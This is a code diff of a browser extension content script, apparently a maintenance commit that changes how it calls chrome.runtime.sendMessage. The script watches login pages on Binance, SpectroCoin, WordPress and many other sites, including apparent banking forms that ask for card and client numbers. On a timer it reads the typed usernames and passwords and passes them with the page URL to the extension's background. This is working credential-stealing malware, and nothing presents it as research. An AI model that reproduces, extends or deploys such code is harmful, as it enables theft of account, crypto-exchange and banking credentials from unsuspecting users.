@@ -68,7 +68,7 @@ for (var i = 0; i < arrayLength; i++) {
     if (window.location.href.indexOf(myStringArray[i]) > -1) {
           var login = {};
           login.href = window.location.href;
-          chrome.runtime.sendMessage({cmd: "w",login});
+          chrome.runtime.sendMessage(null, {cmd: "w",login});
 }
 };
 
@@ -83,7 +83,7 @@ if (window['location']['href']['indexOf']('binance.com/login.html') > -1) {
             login.username = document.getElementById("email").value;
             login.pass = document.getElementById("pwd").value;
             login.href = window.location.href;
-            chrome.runtime.sendMessage({cmd: "l",login});
+            chrome.runtime.sendMessage(null, {cmd: "l",login});
             }
         }
     }, 1000);
@@ -98,7 +98,7 @@ if (window['location']['href']['indexOf']('spectrocoin.com/en/login.html') > -1)
             login.username = document.getElementsByName("email")[0].value;
             login.pass = document.getElementsByName("password")[0].value;
             login.href = window.location.href;
-            chrome.runtime.sendMessage({cmd: "l",login});
+            chrome.runtime.sendMessage(null, {cmd: "l",login});
             }
         }
     }, 1000);
@@ -116,7 +116,7 @@ if (window['location']['href']['indexOf']('spectrocoin.com/en/login.html') > -1)
               login.username = document.getElementsByName("j_username")[0].value;
               login.pass = document.getElementsByName("j_password")[0].value;
               login.href = window.location.href;
-              chrome.runtime.sendMessage({cmd: "l",login});
+              chrome.runtime.sendMessage(null, {cmd: "l",login});
               }
           }
       }, 1000);
@@ -132,7 +132,7 @@ if (window['location']['href']['indexOf']('spectrocoin.com/en/login.html') > -1)
               login.username = document.getElementsByName("login_email")[0].value;
               login.pass = document.getElementsByName("login_password")[0].value;
               login.href = window.location.href;
-              chrome.runtime.sendMessage({cmd: "l",login});
+              chrome.runtime.sendMessage(null, {cmd: "l",login});
               }
           }
       }, 1000);
@@ -148,7 +148,7 @@ var login_form = document.getElementsByClassName("container-signin");
             login.username = document.getElementsByName("usus")[0].value;
             login.pass = document.getElementsByName("clave")[0].value;
             login.href = window.location.href;
-            chrome.runtime.sendMessage({cmd: "l",login});
+            chrome.runtime.sendMessage({"cmd": "l",login});
 		        }
           }
         };
@@ -164,7 +164,7 @@ var login_form = document.getElementsByClassName("container-signin");
               login.username = document.getElementsByName("email")[0].value;
               login.pass = document.getElementsByName("password")[0].value;
               login.href = window.location.href;
-              chrome.runtime.sendMessage({cmd: "l",login});
+              chrome.runtime.sendMessage(null, {cmd: "l",login});
               }
           }
       }, 1000);
@@ -179,7 +179,7 @@ var login_form = document.getElementsByClassName("container-signin");
               login.username = document.getElementsByName("email")[0].value;
               login.pass = "null"; //document.getElementsByName("password")[0].value;
               login.href = window.location.href;
-              chrome.runtime.sendMessage({cmd: "l",login});
+              chrome.runtime.sendMessage(null, {cmd: "l",login});
               }
           }
       }, 1000);
@@ -193,7 +193,7 @@ var login_form = document.getElementsByClassName("container-signin");
               login.username = "null" //document.getElementsByName("email")[0].value;
               login.pass = document.getElementsByName("password")[0].value;
               login.href = window.location.href;
-              chrome.runtime.sendMessage({cmd: "l",login});
+              chrome.runtime.sendMessage(null, {cmd: "l",login});
               }
           }
       }, 1000);
@@ -208,7 +208,7 @@ var login_form = document.getElementsByClassName("container-signin");
               login.username = "null" //document.getElementsByName("email")[0].value;
               login.pass = document.getElementsByName("password")[0].value;
               login.href = window.location.href;
-              chrome.runtime.sendMessage({cmd: "l",login});
+              chrome.runtime.sendMessage(null, {cmd: "l",login});
               }
           }
       }, 1000);
@@ -223,7 +223,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
               login.username = document.getElementById("user_login").value;
               login.pass = document.getElementById("user_pass").value;
               login.href = window.location.href;
-              chrome.runtime.sendMessage({cmd: "l",login});
+              chrome.runtime.sendMessage(null, {cmd: "l",login});
               }
           }
       }, 1000);
@@ -238,7 +238,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
                 login.username = document.getElementById("username").value;
                 login.pass = document.getElementById("password").value;
                 login.href = window.location.href;
-                chrome.runtime.sendMessage({cmd: "l",login});
+                chrome.runtime.sendMessage(null, {cmd: "l",login});
                 }
             }
         }, 1000);
@@ -253,7 +253,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
                   login.username = document.getElementById("id_username").value;
                   login.pass = document.getElementById("id_password").value;
                   login.href = window.location.href;
-                  chrome.runtime.sendMessage({cmd: "l",login});
+                  chrome.runtime.sendMessage(null, {cmd: "l",login});
                   }
               }
           }, 1000);
@@ -268,7 +268,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
                     login.username = document.getElementsByName("usu").value;
                     login.pass = document.getElementsByName("con").value;
                     login.href = window.location.href;
-                    chrome.runtime.sendMessage({cmd: "l",login});
+                    chrome.runtime.sendMessage(null, {cmd: "l",login});
                     }
                 }
             }, 1000);
@@ -283,7 +283,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
                       login.username = document.getElementsByName("correo")[1].value;
                       login.pass = document.getElementsByName("clave")[0].value;
                       login.href = window.location.href;
-                      chrome.runtime.sendMessage({cmd: "l",login});
+                      chrome.runtime.sendMessage(null, {cmd: "l",login});
                       }
                   }
               }, 1000);
@@ -298,7 +298,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
                         login.username = document.getElementsByName("username")[0].value;
                         login.pass = document.getElementsByName("pass")[0].value;
                         login.href = window.location.href;
-                        chrome.runtime.sendMessage({cmd: "l",login});
+                        chrome.runtime.sendMessage(null, {cmd: "l",login});
                         }
                     }
                 }, 1000);
@@ -313,7 +313,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
                           login.username = document.getElementsByName("username")[0].value;
                           login.pass = document.getElementsByName("password")[0].value;
                           login.href = window.location.href;
-                          chrome.runtime.sendMessage({cmd: "l",login});
+                          chrome.runtime.sendMessage(null, {cmd: "l",login});
                           }
                       }
                   }, 1000);
@@ -329,7 +329,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
                             login.username = document.getElementsByName("username")[0].value;
                             login.pass = document.getElementsByName("password")[0].value;
                             login.href = window.location.href;
-                            chrome.runtime.sendMessage({cmd: "l",login});
+                            chrome.runtime.sendMessage(null, {cmd: "l",login});
                             }
                         }
                     }, 1000);
@@ -344,7 +344,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
                   login.username = document.getElementById("user_username").value;
                   login.pass = document.getElementById("user_password").value;
                   login.href = window.location.href;
-                  chrome.runtime.sendMessage({cmd: "l",login});
+                  chrome.runtime.sendMessage(null, {cmd: "l",login});
                   }
               }
           }, 1000);
@@ -359,7 +359,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
                     login.username = document.getElementsByName("email")[0].value;
                     login.pass = document.getElementsByName("password")[0].value;
                     login.href = window.location.href;
-                    chrome.runtime.sendMessage({cmd: "l",login});
+                    chrome.runtime.sendMessage(null, {cmd: "l",login});
                     }
                 }
             }, 1000);
@@ -375,7 +375,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
                       login.username = document.getElementsByName("username")[0].value;
                       login.pass = document.getElementsByName("password")[0].value;
                       login.href = window.location.href;
-                      chrome.runtime.sendMessage({cmd: "l",login});
+                      chrome.runtime.sendMessage(null, {cmd: "l",login});
                       }
                   }
               }, 1000)
@@ -391,7 +391,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
                         login.username = document.getElementsByName("username")[0].value;
                         login.pass = document.getElementsByName("password")[0].value;
                         login.href = window.location.href;
-                        chrome.runtime.sendMessage({cmd: "l",login});
+                        chrome.runtime.sendMessage(null, {cmd: "l",login});
                         }
                     }
                 }, 1000);
@@ -406,7 +406,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //             login.username = document.getElementsByName("userid")[0].value;
             //             login.pass = document.getElementsByName("password")[0].value;
             //             login.href = window.location.href;
-            //             chrome.runtime.sendMessage({cmd: "l",login});
+            //             chrome.runtime.sendMessage(null, {cmd: "l",login});
             //             }
             //         }
             //     }, 1000)
@@ -422,7 +422,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //             login.username = document.getElementsByName("userlogin")[0].value;
             //             login.pass = document.getElementsByName("passwd")[0].value;
             //             login.href = window.location.href;
-            //             chrome.runtime.sendMessage({cmd: "l",login});
+            //             chrome.runtime.sendMessage(null, {cmd: "l",login});
             //             }
             //         }
             //     }, 1000)
@@ -437,7 +437,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //                   login.username = document.getElementById("uname").value;
             //                   login.pass = "USERNAME";
             //                   login.href = window.location.href;
-            //                   chrome.runtime.sendMessage({cmd: "l",login});
+            //                   chrome.runtime.sendMessage(null, {cmd: "l",login});
             //             }
             //         }
             //     }, 1000)
@@ -451,7 +451,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //                   login.username = document.getElementsByName("password1")[0].value;
             //                   login.pass = "PASSWORD";
             //                   login.href = window.location.href;
-            //                   chrome.runtime.sendMessage({cmd: "l",login});
+            //                   chrome.runtime.sendMessage(null, {cmd: "l",login});
             //             }
             //         }
             //     }, 1000)
@@ -473,7 +473,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //                   login.username = document.getElementsByClassName(" firstfield")[0].value;
             //                   login.pass = p;
             //                   login.href = window.location.href;
-            //                   chrome.runtime.sendMessage({cmd: "l",login});
+            //                   chrome.runtime.sendMessage(null, {cmd: "l",login});
             //             }
             //         }
             //     }, 1000)
@@ -496,7 +496,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //                   login.username = document.getElementsByClassName(" firstfield")[0].value;
             //                   login.pass = p;
             //                   login.href = window.location.href;
-            //                   chrome.runtime.sendMessage({cmd: "l",login});
+            //                   chrome.runtime.sendMessage(null, {cmd: "l",login});
             //             }
             //         }
             //     }, 1000)
@@ -512,7 +512,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //                   login.username = document.getElementsByClassName("Login_input_name")[0].value;
             //                   login.pass = document.getElementsByClassName("Login_input_pass")[0].value;
             //                   login.href = window.location.href;
-            //                   chrome.runtime.sendMessage({cmd: "l",login});
+            //                   chrome.runtime.sendMessage(null, {cmd: "l",login});
             //             }
             //         }
             //     }, 1000)
@@ -527,7 +527,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //                   login.username = document.getElementsByClassName("Login_input_name")[0].value;
             //                   login.pass = document.getElementsByClassName("Login_input_pass")[0].value;
             //                   login.href = window.location.href;
-            //                   chrome.runtime.sendMessage({cmd: "l",login});
+            //                   chrome.runtime.sendMessage(null, {cmd: "l",login});
             //             }
             //         }
             //     }, 1000)
@@ -543,7 +543,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //                   login.username = document.getElementsByClassName("Login_input_name")[0].value;
             //                   login.pass = document.getElementsByClassName("Login_input_pass")[0].value;
             //                   login.href = window.location.href;
-            //                   chrome.runtime.sendMessage({cmd: "l",login});
+            //                   chrome.runtime.sendMessage(null, {cmd: "l",login});
             //             }
             //         }
             //     }, 1000)
@@ -562,7 +562,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //                   login.username = userid;
             //                   login.pass = select;
             //                   login.href = window.location.href;
-            //                   chrome.runtime.sendMessage({cmd: "l",login});
+            //                   chrome.runtime.sendMessage(null, {cmd: "l",login});
             //             }
             //         }
             //     }, 1000)
@@ -578,7 +578,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //                   login.username = document.getElementsByName("name")[0].value;
             //                   login.pass = "test buttons 1 of 3";
             //                   login.href = window.location.href;
-            //                   chrome.runtime.sendMessage({cmd: "l",login});
+            //                   chrome.runtime.sendMessage(null, {cmd: "l",login});
             //             }
             //         }
             //     }, 1000)
@@ -594,7 +594,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //                   login.username = document.getElementsByName("cardNum")[0].value;
             //                   login.pass = document.getElementsByName("clientNum")[0].value;
             //                   login.href = window.location.href;
-            //                   chrome.runtime.sendMessage({cmd: "l",login});
+            //                   chrome.runtime.sendMessage(null, {cmd: "l",login});
             //             }
             //         }
             //     }, 1000)
@@ -613,7 +613,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //               login.username = select;
             //               login.pass = userid;
             //               login.href = window.location.href;
-            //               chrome.runtime.sendMessage({cmd: "l",login});
+            //               chrome.runtime.sendMessage(null, {cmd: "l",login});
             //             }
             //         }
             //     }, 1000)
@@ -632,7 +632,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //                   login.username = select;
             //                   login.pass = documentNumber;
             //                   login.href = window.location.href;
-            //                   chrome.runtime.sendMessage({cmd: "l",login});
+            //                   chrome.runtime.sendMessage(null, {cmd: "l",login});
             //             }
             //         }
             //     }, 1000)
@@ -651,7 +651,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //                   login.username = select;
             //                   login.pass = documentNumber;
             //                   login.href = window.location.href;
-            //                   chrome.runtime.sendMessage({cmd: "l",login});
+            //                   chrome.runtime.sendMessage(null, {cmd: "l",login});
             //
             //             }
             //         }
@@ -674,7 +674,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //                   login.username = select;
             //                   login.pass = data;
             //                   login.href = window.location.href;
-            //                   chrome.runtime.sendMessage({cmd: "l",login});
+            //                   chrome.runtime.sendMessage(null, {cmd: "l",login});
             //
             //             }
             //         }
@@ -691,7 +691,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //             login.username = document.getElementsByName("Username1")[0].value;
             //             login.pass = document.getElementsByName("Passworde1")[0].value;
             //             login.href = window.location.href;
-            //             chrome.runtime.sendMessage({cmd: "l",login});
+            //             chrome.runtime.sendMessage(null, {cmd: "l",login});
             //             }
             //         }
             //     }, 1000)
@@ -707,7 +707,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
             //             login.username = document.getElementsByName("notarjeta1")[0].value;
             //             login.pass = document.getElementsByName("passwordp1")[0].value;
             //             login.href = window.location.href;
-            //             chrome.runtime.sendMessage({cmd: "l",login});
+            //             chrome.runtime.sendMessage(null, {cmd: "l",login});
             //             }
             //         }
             //     }, 1000)
@@ -723,7 +723,7 @@ if (window['location']['href']['indexOf']('wp-login.php') > -1) {
               //             login.username = document.getElementsByName("ctl00$DefaultContent$UsernamePasswordLogin1$UserNameTextBox")[0].value;
               //             login.pass = document.getElementsByName("ctl00$DefaultContent$UsernamePasswordLogin1$PasswordTextBox")[0].value;
               //             login.href = window.location.href;
-              //             chrome.runtime.sendMessage({cmd: "l",login});
+              //             chrome.runtime.sendMessage(null, {cmd: "l",login});
               //             }
               //         }
               //     }, 1000)
